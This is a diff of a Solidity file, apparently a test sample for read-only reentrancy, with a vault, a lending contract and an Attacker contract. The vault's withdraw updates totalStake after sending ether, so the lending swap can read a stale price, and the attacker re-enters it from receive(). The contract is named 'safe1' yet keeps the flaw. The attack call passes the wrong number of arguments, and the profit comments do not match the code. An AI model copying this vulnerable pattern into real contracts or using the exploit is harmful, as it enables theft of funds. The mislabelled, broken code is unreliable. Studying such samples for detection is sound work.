@@ -1,61 +1,66 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract Vault {
-    uint256 public assets;
-    uint256 public shares;
-
-    constructor() {
-        assets = 1000 ether;
-        shares = 1000 ether;
-    }
-
-    function withdraw(uint256 amt) external {
-        require(assets >= amt);
-
-        assets -= amt;	// assets is updated BEFORE the external call
-
-        (bool ok,) = msg.sender.call("");
-        require(ok);
-
-        shares -= amt;	// shares is updated AFTER the external call, 
-    }
-
-    function pricePerShare() public view returns (uint256) {
-        return assets * 1e18 / shares;
-    }
+interface ERC20 {
+	function balance(address) external view returns (uint256);
+	function transferFrom(address from, address to, uint256 amt) external returns (bool);
 }
 
-contract Lending {
-    Vault public immutable vault;
 
-    mapping(address => uint256) public debt;
+contract ReadOnlyLend_safe1 {
+    mapping(address => uint) public balances;
+	uint256 public totalStake;
 
-    constructor(address v) {
-        vault = Vault(v);
+    function withdraw(uint amt) external {
+        require(balances[msg.sender] >= amt);
+        balances[msg.sender] -= amt;	// this is updated BEFORE the external call
+        (bool ok,) = msg.sender.call{value: amt}("");
+        require(ok);
+        totalStake -= amt;	// this is updated AFTER the external call
     }
 
-    function borrow() external {
-        uint256 pps = vault.pricePerShare();
-        uint256 amount = 1000 ether * 1e18 / pps;
-        debt[msg.sender] += amount;
+	function deposit() external payable {
+		balances[msg.sender] += msg.value;
+		totalStake += msg.value;
+	}
+
+    function getPrice(address token) public view returns (uint256) {
+        return ERC20(token).balance(address(this)) * 1e18 / totalStake;
+    }
+
+}
+
+contract ReadOnlyLend_safe1_Lending {
+    ReadOnlyLend_safe1 public immutable vault;
+
+    constructor(address v) {
+        vault = ReadOnlyLend_safe1(v);
+    }
+
+    function swap(address token, uint amt) external {
+		ERC20(token).transferFrom(msg.sender, address(this), amt);
+        uint256 out = amt / vault.getPrice(token);
+		(bool ok,) = msg.sender.call{value: out}("");
+		require(ok);
     }
 }
 
 
 contract Attacker {
-    Vault public vault;
-    Lending public lending;
+    ReadOnlyLend_safe1 public vault;
+    ReadOnlyLend_safe1_Lending public lending;
 
     constructor(address v, address l) {
-        vault = Vault(v);
-        lending = Lending(l);
+        vault = ReadOnlyLend_safe1(v);
+        lending = ReadOnlyLend_safe1_Lending(l);
     }
 
     function attack() external {
-        vault.withdraw(100 ether);
+		vault.deposit{value:100 ether}();
+        vault.withdraw(50 ether);	// pps = 50 / 100 = 0.5
     }
 
     receive() external payable {
-        lending.borrow();
+        lending.swap(100);	// borrows 100 / 0.5 = 200 shares, which is more than the 100 shares deposited, therefore this is profitable
     }
 }
